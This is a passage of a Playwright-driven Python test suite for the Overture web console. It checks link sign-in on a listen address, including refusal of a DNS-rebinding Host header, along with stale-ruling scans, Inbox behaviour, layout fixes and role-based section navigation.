                self.assertIn("Everyone signed in with a sign-in link can do everything here.", text)
                self.assertNotIn("Access", text)
                rows = page.locator(".ck-people-log-row").all_text_contents()
                self.assertTrue(any("bob@example.com was invited (from the terminal)" in r for r in rows), rows)
                self.assertFalse(any("agent.py invite" in r for r in rows), rows)


class ListenBrowserTests(unittest.TestCase):
    """1.47.0 (--listen): a real browser signs in by link on the listen address (a loopback alias on a fake
    ZeroTier interface, through netif's test hook) and the console loads there; a foreign Host is refused."""

    setUpClass = classmethod(LiveConsoleTests.setUpClass.__func__)
    tearDownClass = classmethod(LiveConsoleTests.tearDownClass.__func__)

    def test_sign_in_on_the_listen_address_loads_the_console_and_a_foreign_host_is_refused(self):
        # Catches: the sign-in page's button failing on the overlay origin (the Origin check or the cookie taken
        # from the loopback socket), the cookie set for another host, the console not loading on
        # http://LISTEN:PORT on that cookie, and a request naming another Host answered (DNS rebinding).
        import http.client
        import tempfile
        from unittest import mock
        from overture import devices as DV
        from overture import netif as NI
        from overture import server as SV
        from test_server import LISTEN, FAKE_IFACES, free_port, page_body
        NI.set_fake(lambda: list(FAKE_IFACES), loopback_ok=True)
        self.addCleanup(NI.set_fake, None)
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                td = tempfile.mkdtemp(prefix="ck-listen-")
                self.addCleanup(lambda d=td: __import__("shutil").rmtree(d, ignore_errors=True))
                env = mock.patch.dict(os.environ, {"XDG_CONFIG_HOME": str(Path(td) / "cfg")})
                env.start()
                self.addCleanup(env.stop)
                port, root = free_port(), Path(td)
                cfg = SV.Config(root=root, page=None, state=root / "state", adapter=root / "unused.py",
                                team_domain="", aud="", hostname="", port=port, project="listen-test", auth="link",
                                origin=f"http://{LISTEN}:{port}", listen=LISTEN)
                console = SV.Console(cfg, _LiveAdapter())
                console.publish_page({"commit": console.push_page_snapshot(page_body(LIVE_HOST))["staged"]})
                owner = SV.owner_server(console, SV.link_verifier(cfg), port)
                threading.Thread(target=owner.serve_forever, daemon=True).start()
                self.addCleanup(owner.server_close)
                self.addCleanup(owner.shutdown)
                url = f"http://{LISTEN}:{port}/"
                tok = DV.invite(cfg.devices_file, "owner@example.com", cfg.state)[0]
                browser = getattr(self.pw, kind).launch()
                self.addCleanup(browser.close)
                page = browser.new_context().new_page()
                errors = []
                page.on("pageerror", lambda e: errors.append(str(e)))
                page.goto(url + "signin?t=" + tok)
                page.wait_for_selector("text=Sign this browser in as owner@example.com?")
                page.click("button:has-text('Sign this browser in')")
                page.wait_for_url(url)
                _wait_for(page, "document.querySelector('.ck-inbox-count') && "
                                "document.querySelector('.ck-inbox-count').textContent !== '✉'")
                status = page.evaluate("fetch('/api/view', {credentials: 'same-origin'}).then(r => r.status)")
                self.assertEqual(status, 200)
                cookie = page.context.cookies()[0]
                self.assertEqual((cookie["name"], cookie["domain"]), ("overture-device", LISTEN))
                conn = http.client.HTTPConnection(LISTEN, port, timeout=10)
                conn.request("GET", "/api/view", headers={"Host": f"rebind.example:{port}",
                                                          "Cookie": f"overture-device={cookie['value']}"})
                r = conn.getresponse()
                self.assertEqual((r.status, json.loads(r.read())), (403, {"error": SV.NOT_SIGNED_IN}))
                conn.close()
                self.assertEqual(errors, [])


class ScanUITests(unittest.TestCase):
    """CONSOLE-kit/Q40 (button_now) and Q41 (side file): scanning stale rulings for a resolve, on the page."""

    setUpClass = classmethod(LiveConsoleTests.setUpClass.__func__)
    tearDownClass = classmethod(LiveConsoleTests.tearDownClass.__func__)
    serve = LiveConsoleTests.serve
    page = LiveConsoleTests.page
    open_inbox = LiveConsoleTests.open_inbox
    open_item = InboxUXTests.open_item
    said = InboxUXTests.said

    RULES = "# Rules\nRULE-ALPHA: every release is reviewed twice.\nRULE-BETA: the console never runs code.\n" \
            "RULE-DELTA: the owner locks answers.\n"

    def ruling(self, n, text, **over):
        """LANE.1/Q<n>, answered and locked against the excerpt `text` of rules.md."""
        qid = f"LANE.1/Q{n}"
        self.console.write("question", {
            "qid": qid, "item": "LANE.1", "text": f"Does {text.split(':')[0]} still hold?", "kind": "single",
            "options": [{"id": "a", "label": "Yes"}, {"id": "b", "label": "No"}], "star": "a",
            "valid_if": [{"kind": "excerpt", "path": "rules.md", "text": text}], "source": "rules.md:1",
            "nonce": f"scanq{n:04d}", **over}, "agent")
        ans = self.console.write("answer", {"qid": qid, "picks": ["a"], "own_text": "", "nonce": f"scana{n:04d}"},
                                 "owner")
        lk = self.console.write("lock", {"qid": qid, "answer": ans["id"], "nonce": f"scanl{n:04d}"}, "owner")
        return qid, lk["id"]

    def setup_rulings(self):
        """Q1 and Q2 stale (their rules were reworded), Q3 holding."""
        url = self.serve()
        (self.cfg.root / "rules.md").write_text(self.RULES)
        self.q1, self.l1 = self.ruling(1, "RULE-ALPHA: every release is reviewed twice.")
        self.q2, self.l2 = self.ruling(2, "RULE-BETA: the console never runs code.")
        self.q3, self.l3 = self.ruling(3, "RULE-DELTA: the owner locks answers.")
        (self.cfg.root / "rules.md").write_text(self.RULES.replace("reviewed twice", "reviewed once")
                                                .replace("never runs code", "may run tests"))
        return url

    def scans(self):
        p = self.cfg.state / "refactor.jsonl"
        return [r for r in (json.loads(x) for x in p.read_text().splitlines()) if r["type"] == "scan"] \
            if p.exists() else []

    def card(self, page, qid):
        return page.locator(f".ck-question[data-qid='{qid}']")

    def test_q40_each_stale_ruling_offers_a_scan_and_pressing_asks_one_that_changes_nothing(self):
        # Catches: the button on a ruling that holds, a press that writes a ruling (withdraw, keep, lock) or
        # anything in store.jsonl, a scan naming a lock the page was not shown, buttons still offered while a
        # scan is open (the second press would only be refused), and a press nobody hears happened.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.setup_rulings()
                store_before = self.cfg.store.read_bytes()
                page = self.page(kind, 1280, url)
                self.open_item(page)
                for qid in (self.q1, self.q2):
                    self.assertEqual(self.card(page, qid).locator(".ck-scan-one").count(), 1, qid)
                self.assertEqual(self.card(page, self.q3).locator(".ck-scan-one").count(), 0)
                self.card(page, self.q1).locator(".ck-scan-one").click()
                self.said(page, f"Scan asked for {self.q1}")
                self.assertEqual([(s["qids"], s["locks"], s["by"]) for s in self.scans()],
                                 [([self.q1], [self.l1], "owner")])
                self.assertEqual(self.cfg.store.read_bytes(), store_before)
                page.wait_for_selector(f".ck-scan-status[data-qid='{self.q1}']")
                self.assertIn("waiting on the steward",
                              self.card(page, self.q1).locator(".ck-scan-status").text_content())
                self.assertIn("A scan is open", self.card(page, self.q2).locator(".ck-scan-status").text_content())
                self.assertEqual(page.locator(".ck-scan-one").count(), 0)
                self.assertGreater(self.card(page, self.q1).locator(".ck-stale-banner").count(), 0)   # still stale

    def test_q40_scan_all_is_one_request_naming_every_stale_ruling_once(self):
        # Catches: "Scan all" sent as one request per ruling, a list that misses a stale ruling or names one that
        # holds, a double press queueing a second scan, and a control left on offer once the scan is open.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.setup_rulings()
                page = self.page(kind, 1280, url)
                self.open_inbox(page, 1280)
                go = page.locator(".ck-scan-all-go")
                self.assertEqual(go.text_content(), "Scan all stale (2)")
                go.dblclick()
                _wait_for(page, "!document.querySelector('.ck-scan-all-go')")
                self.said(page, "Scan asked for 2 stale rulings")
                self.assertEqual([(s["qids"], s["locks"]) for s in self.scans()],
                                 [([self.q1, self.q2], [self.l1, self.l2])])
                self.assertIn("2 of 2 rulings still wait on the steward",
                              page.locator(".ck-scan-all .ck-scan-status").text_content())

    def test_q40_the_stewards_advice_shows_with_its_evidence_and_changes_nothing(self):
        # Catches: advice shown as a ruling (the ruling withdrawn or kept by the steward's word), advice with no
        # evidence, and a page that hides the owner's own Withdraw and Keep once advice is in.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.setup_rulings()
                self.console.advise({"qid": self.q1, "star": "withdraw",
                                     "evidence": "RULE-ALPHA now says reviewed once; the twice-review premise is gone.",
                                     "nonce": "scanadv0001"})
                page = self.page(kind, 1280, url)
                self.open_item(page)
                adv = self.card(page, self.q1).locator(".ck-advice")
                self.assertIn("The steward recommends: ★ Withdraw", adv.text_content())
                self.assertIn("the twice-review premise is gone", adv.text_content())
                self.assertIn("Nothing changes until you press Withdraw", adv.text_content())
                for label in ("Withdraw this ruling", "Keep this ruling and stop checking it"):
                    self.assertEqual(self.card(page, self.q1).locator(f"button[aria-label^='{label}']").count(), 1,
                                     label)
                code, view = self.SV.agent_request(self.cfg.socket, "GET", "/view")
                self.assertEqual(view["view"]["questions"][self.q1]["state"], "stale")
                self.assertNotIn("outcome", view["view"]["questions"][self.q1]["refactor"])

    # -- a stale ruling in the Inbox, wherever it came from ----------------------------------

    def setup_forked_round(self):
        """A deliberation round on LANE.1: Q1 a locked ruling that has gone stale, Q4 still open.

        Q3 is a stale ruling from no round, so the Inbox holds two stale rows on one item.
        """
        url = self.serve()
        (self.cfg.root / "rules.md").write_text(self.RULES)
        f = self.console.write("message", {"item": "LANE.1", "text": "go", "intent": "fork", "mode": "explore",
                                           "nonce": "stalefork01"}, "owner")
        self.fork = f["id"]
        self.q1, self.l1 = self.ruling(1, "RULE-ALPHA: every release is reviewed twice.",
                                       forked_from=self.fork, star_by="panel")
        self.q3, self.l3 = self.ruling(3, "RULE-DELTA: the owner locks answers.")
        self.q4 = "LANE.1/Q4"
        self.console.write("question", {
            "qid": self.q4, "item": "LANE.1", "text": "Which way now?", "kind": "single",
            "options": [{"id": "a", "label": "This"}, {"id": "b", "label": "That"}], "star": "a",
            "valid_if": [], "source": "rules.md:1", "forked_from": self.fork, "star_by": "panel",
            "nonce": "staleopen04"}, "agent")
        (self.cfg.root / "rules.md").write_text(self.RULES.replace("reviewed twice", "reviewed once")
                                                .replace("the owner locks answers", "the owner signs answers"))
        return url

    def inbox_row(self, page, qid):
        return page.locator(f".ck-inbox-item[data-qid='{qid}']")

    def test_a_stale_ruling_from_a_round_is_reachable_from_the_inbox_and_offers_its_proposal(self):
        # Catches: a stale ruling from a deliberation round filed under its round, whose form walks open
        # questions only, so it shows nowhere in the Inbox; a row that does not say which question it is (two
        # stale rows on one item read the same); a row silent about the steward's proposal or advice; and a
        # row that opens somewhere without the stale card's Confirm.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.setup_forked_round()
                self.console.propose_anchor({"qid": self.q1, "cites": ["rules.md:2"],
                                             "basis": "RULE-ALPHA now says reviewed once", "nonce": "staleprop01"})
                self.console.advise({"qid": self.q3, "star": "keep", "evidence": "RULE-DELTA still means the same.",
                                     "nonce": "staleadv003"})
                page = self.page(kind, 1280, url)
                self.open_inbox(page, 1280)
                r1, r3 = self.inbox_row(page, self.q1), self.inbox_row(page, self.q3)
                self.assertEqual(r1.count(), 1, "the stale ruling from the round has no Inbox row")
                self.assertEqual(r3.count(), 1)
                self.assertIn("Q1", r1.locator(".ck-inbox-item-qnum").text_content())
                self.assertIn("Q3", r3.locator(".ck-inbox-item-qnum").text_content())
                self.assertNotEqual(r1.text_content(), r3.text_content())
                self.assertIn("a new anchor is proposed", r1.text_content())
                self.assertNotIn("advice", r1.text_content())
                self.assertIn("advice is waiting", r3.text_content())
                self.assertNotIn("proposed", r3.text_content())
                self.assertIn(self.q1, r1.get_attribute("aria-label"))
                r1.click()
                card = self.card(page, self.q1)
                card.wait_for()
                self.assertGreater(card.locator(".ck-stale-banner").count(), 0)
                self.assertEqual(card.locator("button[aria-label^='Confirm the proposed anchor']").count(), 1)

    def test_a_round_with_one_open_and_one_stale_question_still_counts_one_step(self):
        # Catches: the stale ruling counted into its round (the card says 2 questions, or the form walks a
        # locked ruling), and the round dropped from the Inbox because one of its questions went stale.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.setup_forked_round()
                page = self.page(kind, 1280, url)
                self.open_inbox(page, 1280)
                rc = page.locator(f".ck-round-card[data-fork='{self.fork}']")
                self.assertEqual(rc.count(), 1, "the round left the Inbox")
                self.assertIn("1 question ·", rc.text_content())
                self.assertEqual(self.inbox_row(page, self.q4).count(), 0, "an open round question listed loose")
                rc.locator("button").click()
                page.wait_for_selector(".ck-round-title")
                self.assertEqual(page.locator(f".ck-panel .ck-question[data-qid='{self.q1}']").count(), 0)

    def test_a_stale_ruling_is_never_grouped_into_an_answer_together_round(self):
        # Catches: a stale ruling and an open question from one named agent offered as "Answer these 2
        # together", whose round would walk only the open one, so the button promises what the form never shows.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                (self.cfg.root / "rules.md").write_text(self.RULES)
                text = "RULE-ALPHA: every release is reviewed twice."
                self.console.write("question", {
                    "qid": "LANE.1/Q1", "item": "LANE.1", "text": "Does RULE-ALPHA still hold?", "kind": "single",
                    "options": [{"id": "a", "label": "Yes"}, {"id": "b", "label": "No"}], "star": "a",
                    "valid_if": [{"kind": "excerpt", "path": "rules.md", "text": text}], "source": "rules.md:1",
                    "nonce": "grpq000001"}, "agent", agent="steward-a")
                ans = self.console.write("answer", {"qid": "LANE.1/Q1", "picks": ["a"], "own_text": "",
                                                    "nonce": "grpa000001"}, "owner")
                self.console.write("lock", {"qid": "LANE.1/Q1", "answer": ans["id"], "nonce": "grpl000001"}, "owner")
                self.console.write("question", {
                    "qid": "LANE.1/Q2", "item": "LANE.1", "text": "Which way now?", "kind": "single",
                    "options": [{"id": "a", "label": "This"}, {"id": "b", "label": "That"}], "star": "a",
                    "valid_if": [], "source": "rules.md:1", "nonce": "grpq000002"}, "agent", agent="steward-a")
                (self.cfg.root / "rules.md").write_text(self.RULES.replace("reviewed twice", "reviewed once"))
                page = self.page(kind, 1280, url)
                self.open_inbox(page, 1280)
                self.assertEqual(self.inbox_row(page, "LANE.1/Q1").count(), 1)
                self.assertEqual(page.locator(".ck-cluster").count(), 0, "a stale ruling was grouped")


# 1.47 (U4): the layout bugs the docs screenshots showed. Each test measures the thing the screenshot got wrong.
BOX = "s => { const r = document.querySelector(s).getBoundingClientRect(); return [r.left, r.top, r.right, r.bottom]; }"


class LayoutFixTests(unittest.TestCase):
    """1.47 (U4, U9): Operator Shift, the snooze menu, the panel title, the locked pill, the Triggers tab, the
    impact graph, Portfolio's setup card and the Delegate bar, in a real browser on the real server."""

    setUpClass = classmethod(LiveConsoleTests.setUpClass.__func__)
    tearDownClass = classmethod(LiveConsoleTests.tearDownClass.__func__)
    serve = LiveConsoleTests.serve
    agent_post = LiveConsoleTests.agent_post
    ask = LiveConsoleTests.ask
    bell = LiveConsoleTests.bell
    page = LiveConsoleTests.page
    open_inbox = LiveConsoleTests.open_inbox
    answer = InboxUXTests.answer
    lock = InboxUXTests.lock
    open_item = InboxUXTests.open_item

    def playbook(self, name="release-triage", description="Before a release: a heads-up while questions wait, "
                 "then a tighten round on the lane", steps=None):
        d = self.cfg.root / ".overture" / "playbooks"
        d.mkdir(parents=True, exist_ok=True)
        (d / f"{name}.json").write_text(json.dumps({"description": description,
                                                    "steps": steps or [{"kind": "chat", "text": "heads-up"}]}))

    def triggers(self):
        from overture import triggers as TR
        self.playbook()
        self.console.triggers.set_all({"pr-merged": TR.Trigger("pr-merged", "release-triage", "a" * 64, None)})
        self.console.triggers.log("pr-merged", "webhook", "2026-10-16T09:00:00Z", 1, 0)

    def test_operator_shift_is_one_dialog_with_its_parts_stacked(self):
        # Catches (U4): the head, the text and the buttons laid out side by side as three loose boxes (a flex
        # row), and a dialog that runs off a short screen with no way to reach its buttons.
        for kind in BROWSERS:
            for width in (1440, 375):
                with self.subTest(browser=kind, width=width):
                    url = self.serve()
                    page = self.page(kind, width, url)
                    page.keyboard.press("Control+k")
                    page.fill(".ck-palette-input", "Operator shift")
                    page.keyboard.press("Enter")
                    page.wait_for_selector("#ck-shift .ck-shift-actions")
                    head, body, acts = (page.evaluate(BOX, s) for s in
                                        (".ck-shift-head", ".ck-shift-body", ".ck-shift-actions"))
                    for box in (body, acts):
                        self.assertAlmostEqual(box[0], head[0], delta=1)   # one left edge
                        self.assertAlmostEqual(box[2], head[2], delta=1)   # one right edge
                    self.assertLessEqual(head[3], body[1] + 1)
                    self.assertLessEqual(body[3], acts[1] + 1)
                    page.locator("#ck-shift .ck-shift-actions button", has_text="Close").scroll_into_view_if_needed()
                    page.locator("#ck-shift .ck-shift-actions button", has_text="Close").click()
                    _wait_for(page, "!document.getElementById('ck-shift')")

    def test_the_snooze_menu_draws_over_the_next_ribbon_row(self):
        # Catches (U4): the ⌛ menu clipped by its row's overflow, so the next ribbon row covered it and its
        # presets could not be clicked.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                for n in (1, 2, 3):
                    self.ask(n)
                page = self.page(kind, 1280, url)
                self.open_inbox(page, 1280)
                page.wait_for_selector(".ck-priority-row >> nth=2")
                page.locator(".ck-priority-row >> nth=0").locator(".ck-snooze-btn").click()
                page.wait_for_selector(".ck-snooze-menu:not([hidden])")
                on_top = page.evaluate("""() => [...document.querySelectorAll('.ck-snooze-menu:not([hidden]) .ck-snooze-opt')]
                  .map(o => { const r = o.getBoundingClientRect();
                              return o.contains(document.elementFromPoint(r.left + r.width / 2, r.top + r.height / 2)); })""")
                self.assertEqual(on_top, [True, True, True])
                page.locator(".ck-snooze-menu:not([hidden]) .ck-snooze-opt >> nth=0").click()
                _wait_for(page, "document.querySelectorAll('.ck-priority-row').length === 2")

    def test_the_panel_title_names_the_tab_on_show(self):
        # Catches (U4): a title that said "Inbox" on every tab.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                page = self.page(kind, 1280, url)
                for tab, title in (("inbox", "Inbox"), ("feed", "Feed"), ("playbooks", "Playbooks"),
                                   ("triggers", "Triggers"), ("portfolio", "Portfolio")):
                    page.evaluate("t => ConsoleKit.openTab(t)", tab)
                    _wait_for(page, "t => document.querySelector('.ck-panel .ck-header .ck-title').textContent === t",
                              title)

    def test_an_unrolled_locked_card_shows_one_locked_pill(self):
        # Catches (U4): "locked" drawn twice on an opened locked card, once on its line and once in its header.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                self.ask(1)
                self.answer("LANE.1/Q1")
                self.lock("LANE.1/Q1")
                page = self.page(kind, 1280, url)
                self.open_item(page)
                page.click(".ck-question[data-qid='LANE.1/Q1'] .ck-q-line")
                page.wait_for_selector(".ck-question[data-qid='LANE.1/Q1'] .ck-q-header")
                self.assertEqual(page.locator(
                    ".ck-question[data-qid='LANE.1/Q1'] .ck-q-state[data-state='locked']").count(), 1)

    def test_the_triggers_tab_lists_its_firings_flat_and_the_fold_stays_on_the_inbox(self):
        # Catches (U4, U9): a second collapsed "Triggers" fold inside the Triggers tab hiding its firings, and
        # the Inbox's Triggers fold drawn on every other tab too.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                self.triggers()
                page = self.page(kind, 1280, url)
                page.evaluate("ConsoleKit.openTab('triggers')")
                page.wait_for_selector(".ck-trigger-list")
                self.assertEqual(page.locator(".ck-panel details.ck-triggers").count(), 0)
                self.assertTrue(page.locator("#ck-tabpanel .ck-trigger-log-row")
                                .first.is_visible())
                for tab, folds in (("feed", 0), ("portfolio", 0), ("inbox", 1)):
                    page.evaluate("t => ConsoleKit.openTab(t)", tab)
                    _wait_for(page, "t => document.querySelector('.ck-panel .ck-header .ck-title').textContent === t",
                              tab.capitalize())
                    self.assertEqual(page.locator(".ck-panel details.ck-triggers").count(), folds, tab)

    def test_the_impact_graph_frame_fits_its_graph(self):
        # Catches (U9): a fixed 440px frame whose stage ran past its bottom (the filter bar wraps in a narrow
        # column), cutting the lower nodes off, and a frame that never takes the graph's own height.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                for n in (1, 2):
                    self.ask(n)
                page = self.page(kind, 1280, url)
                self.open_item(page)
                page.click(".ck-impact-slot >> xpath=.. >> summary")
                page.wait_for_selector(".ck-impact-slot iframe")
                _wait_for(page, "document.querySelector('.ck-impact-slot iframe').style.height !== ''")
                frame = page.frame_locator(".ck-impact-slot iframe")
                frame.locator("#ck-cyto canvas").first.wait_for()
                fits = page.frames[-1].evaluate("document.getElementById('ck-stage').getBoundingClientRect().bottom"
                                                " <= innerHeight + 1")
                self.assertTrue(fits)
                slot = page.evaluate("() => { const s = document.querySelector('.ck-impact-slot');"
                                     " return [s.clientHeight, parseFloat(getComputedStyle(s).maxHeight)]; }")
                self.assertLessEqual(slot[0], slot[1])

    def test_the_impact_graph_hint_sits_below_the_graph(self):
        # Catches: the "Drag · wheel to zoom" hint drawn inside the stage, over the graph, where it covered the
        # lowest node (a cited file in the docs screenshot).
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                self.ask(1)
                page = self.page(kind, 1280, url)
                self.open_item(page)
                page.click(".ck-impact-slot >> xpath=.. >> summary")
                page.wait_for_selector(".ck-impact-slot iframe")
                page.frame_locator(".ck-impact-slot iframe").locator("#ck-cyto canvas").first.wait_for()
                frame = next(f for f in page.frames if "/impact-graph?" in f.url)
                stage, note = (frame.evaluate(BOX, s) for s in ("#ck-stage", ".ck-cyto-note"))
                self.assertGreaterEqual(note[1], stage[3], (stage, note))
                self.assertLessEqual(note[3], frame.evaluate("innerHeight") + 1)

    def test_the_impact_graph_state_chips_read_as_words(self):
        # Catches (1.47 docs): the state chips built from chart.py's ASCII badges glued to the word, so the
        # locked chip read "olocked"; each now shows the console's glyph for its state, a space, then the word.
        want = ["\u25d0 you", "\u25d1 unlocked", "\u25cb locked", "\u25cc stale"]
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                self.ask(1)
                page = self.page(kind, 1280, url)
                self.open_item(page)
                page.click(".ck-impact-slot >> xpath=.. >> summary")
                page.wait_for_selector(".ck-impact-slot iframe")
                page.frame_locator(".ck-impact-slot iframe").locator("#ck-cyto canvas").first.wait_for()
                frame = next(f for f in page.frames if "/impact-graph?" in f.url)
                chips = frame.evaluate("() => [...document.querySelectorAll('#ck-filters .ck-chip')]"
                                       ".map(b => b.textContent)")
                self.assertEqual(chips[5:9], want, chips)
                self.assertNotIn("olocked", chips)

    def test_only_the_impact_graph_frame_may_resize_itself(self):
        # Catches: the ck-chart-size handler resizing ANY .ck-item-chart-frame (the status flowchart, the ticket
        # graph), so a chart frame other than the impact graph could set its own height.
        post = "h => parent.postMessage({type: 'ck-chart-size', height: h}, '*')"
        height = "s => document.querySelector(s).style.height"
        flow, impact = (".ck-item-chart-slot:not(.ck-impact-slot) > iframe.ck-item-chart-frame",
                        ".ck-impact-slot > iframe.ck-item-chart-frame")
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                self.ask(1)
                page = self.page(kind, 1280, url)
                self.open_item(page)
                page.locator("details.ck-item-chart > summary", has_text="Status flowchart").click()
                page.click(".ck-impact-slot >> xpath=.. >> summary")
                page.wait_for_selector(flow)
                page.wait_for_selector(impact)
                _wait_for(page, "s => document.querySelector(s).style.height !== ''", impact)   # its own ask
                frames = {}
                for _ in range(300):
                    frames = {k: f for f in page.frames for k in ("/item-chart?", "/impact-graph?") if k in f.url}
                    if len(frames) == 2:
                        break
                    time.sleep(0.1)
                self.assertEqual(len(frames), 2, [f.url for f in page.frames])
                frames["/item-chart?"].evaluate(post, 1234)
                frames["/impact-graph?"].evaluate(post, 1357)
                _wait_for(page, "s => document.querySelector(s).style.height === '1357px'", impact)
                self.assertEqual(page.evaluate(height, flow), "", "the flowchart frame resized itself")

    def test_portfolio_setup_links_the_guide_and_its_command_wraps(self):
        # Catches (U4): "Setup guide" pointing at a README anchor that does not exist, and the command box cut
        # off at the column's right edge. Catches (1.47 docs): the link landing at the page's top instead of the
        # Portfolio section, and the box suggesting `/overture:portfolio-add`, a skill the plugin never shipped,
        # instead of the real steps (`agent.py portfolio-token`).
        guide = "https://github.com/MikeHeid/overture/blob/main/docs/features/dashboard-and-map.md"
        section = Path(__file__).with_name("docs").joinpath("features", "dashboard-and-map.md").read_text()
        self.assertIn("\n## Portfolio: your other consoles\n", section)
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                page = self.page(kind, 1280, url)
                page.evaluate("ConsoleKit.openTab('portfolio')")
                page.wait_for_selector(".ck-portfolio-upgrade-code")
                self.assertEqual(page.get_attribute(".ck-portfolio-upgrade-doc a", "href"),
                                 guide + "#portfolio-your-other-consoles")
                steps = page.text_content(".ck-portfolio-upgrade-code")
                self.assertNotIn("portfolio-add", steps)
                self.assertIn("agent.py portfolio-token", steps)
                self.assertIn("portfolio-secrets/<peer>.json", steps)
                self.assertIn(".overture/portfolio.json", steps)
                self.assertTrue(page.evaluate("() => { const p = document.querySelector('.ck-portfolio-upgrade-code');"
                                              " return p.scrollWidth <= p.clientWidth; }"))

    def test_the_delegate_bar_in_playbook_mode_fits_and_hides_the_item_picker(self):
        # Catches (U4): radio rows pushed past the bar's right edge by a long playbook <option>, and the "On item"
        # picker left on show, greyed out, where it does not apply.
        for kind in BROWSERS:
            for width in (1280, 375):
                with self.subTest(browser=kind, width=width):
                    url = self.serve()
                    self.playbook()
                    page = self.page(kind, width, url)
                    self.open_inbox(page, width)
                    page.click(".ck-delegate-summary")
                    page.check("input[name='ck-del-kind'][value='playbook']")
                    self.assertFalse(page.is_visible("#ck-del-item"))
                    over = page.evaluate("""() => { const b = document.querySelector('.ck-delegate-body').getBoundingClientRect();
                      return [...document.querySelectorAll('.ck-delegate-body .ck-option, #ck-del-playbook')]
                        .filter(e => e.getBoundingClientRect().right > b.right + 1).length; }""")
                    self.assertEqual(over, 0)
                    page.check("input[name='ck-del-kind'][value='round']")
                    self.assertTrue(page.is_visible("#ck-del-item"))


# A phone's host page (1.48, U2): a viewport meta, as a real page has (without one a phone lays the page out 980px
# wide), and content wider than the phone, as the showcase spilled to 554px in uxshot 02.
PHONE_HOST = LIVE_HOST.replace('<meta charset="utf-8">', '<meta charset="utf-8">'
                               '<meta name="viewport" content="width=device-width, initial-scale=1">').replace(
    '<body>', '<body>\n<div id="host-spill" style="width:554px;height:40px;background:#ccc">wide host content</div>', 1)
RAIL = "() => [...document.querySelectorAll('.ck-rail .ck-rail-btn')].map(b => b.dataset.section)"
STRIP = "() => [...document.querySelectorAll('.ck-tabs .ck-tab')].map(b => b.id.replace('ck-tab-', ''))"
CURRENT = """() => { const s = document.querySelector('.ck-rail-btn[aria-current="page"]');
  const t = document.querySelector('.ck-tab[aria-selected="true"]');
  return [s && s.dataset.section, t && t.id.replace('ck-tab-', '')]; }"""
# WCAG contrast of two computed colours, as rgb()/rgba() or color(srgb …) (what color-mix computes to).
CONTRAST_JS = """([fg, bg]) => {
  const parse = c => { const n = (c.match(/[\\d.]+/g) || []).map(Number);
    return c.startsWith('color(') ? n.slice(0, 3).map(v => v * 255) : n.slice(0, 3); };
  const lum = c => { const [r, g, b] = parse(c).map(v => { v /= 255; return v <= 0.04045 ? v / 12.92 : ((v + 0.055) / 1.055) ** 2.4; });
    return 0.2126 * r + 0.7152 * g + 0.0722 * b; };
  const [a, b] = [lum(fg), lum(bg)].sort((x, y) => y - x);
  return (a + 0.05) / (b + 0.05); }"""


class SectionTests(unittest.TestCase):
    """1.48 (U1, U2, U8, U9): the section rail, the console full screen on a phone, labels at the narrowest widths,
    and motion that only a real change of section or tab sets off. In a real browser on the real server."""

    setUpClass = classmethod(LiveConsoleTests.setUpClass.__func__)
    tearDownClass = classmethod(LiveConsoleTests.tearDownClass.__func__)
    serve = LiveConsoleTests.serve
    agent_post = LiveConsoleTests.agent_post
    ask = LiveConsoleTests.ask
    page = LiveConsoleTests.page
    open_inbox = LiveConsoleTests.open_inbox

    def g(self, page, key):
        page.keyboard.press("g")
        page.keyboard.press(key)

    def test_the_rail_shows_each_role_its_sections_and_sub_tabs(self):
        # Catches: role visibility lost in the move to sections (People shown to a director or a member, Settings to
        # a member or a plain viewer); Team dropped for a login that may not see People or Settings (Chat alone
        # keeps it); a section shown with an empty strip; and the rail without its landmark name or aria-current.
        from overture import roles as RO
        cases = (("owner", {}, ["people", "chat", "settings"]),
                 ("director", {"director": True}, ["chat", "settings"]),
                 ("member", {}, ["chat"]),
                 ("viewer", {}, ["chat"]))
        for kind in BROWSERS:
            for role, extra, team in cases:
                with self.subTest(browser=kind, role=role):
                    url = self.serve()
                    RO.set_role(self.cfg.state, "boss@example.com", "owner")
                    if role == "owner":
                        RO.set_role(self.cfg.state, "owner@example.com", "owner")
                    elif role == "member":
                        RO.set_role(self.cfg.state, "owner@example.com", "member", ["LANE"])
                    else:
                        RO.set_role(self.cfg.state, "owner@example.com", "viewer", **extra)
                    page = self.page(kind, 1280, url)
                    self.open_inbox(page, 1280)
                    self.assertEqual(page.locator("nav.ck-rail[aria-label='Sections']").count(), 1)
                    self.assertEqual(page.evaluate(RAIL), ["work", "automation", "projects", "team"])
                    self.assertEqual(page.evaluate(CURRENT), ["work", "inbox"])
                    self.assertEqual(page.evaluate(STRIP), ["inbox", "feed", "tickets", "prs"])
                    self.assertEqual(page.locator(".ck-tabs[role='tablist']").get_attribute("aria-label"), "Work views")
                    strips = {}
                    for sec in ("automation", "projects", "team"):
                        page.click(f".ck-rail-btn[data-section='{sec}']")
                        _wait_for(page, "s => document.querySelector('.ck-rail-btn[aria-current=\"page\"]').dataset.section === s",
                                  sec)
                        strips[sec] = page.evaluate(STRIP)
                    self.assertEqual(strips, {"automation": ["playbooks", "triggers"],
                                              "projects": ["portfolio", "favorite"], "team": team})
                    self.assertEqual(page.locator(".ck-rail-btn[aria-current='page']").count(), 1)
                    self.assertEqual(page.locator(".ck-tab-more, .ck-more-menu").count(), 0)

    def test_every_g_shortcut_reaches_its_tab_and_section(self):
        # Catches: a `g X` lost in the move (each must still open its tab), one that opens the tab but leaves the rail
        # on the old section, `g 1`–`g 4` going anywhere but the section's last-used sub-tab (or its first, before
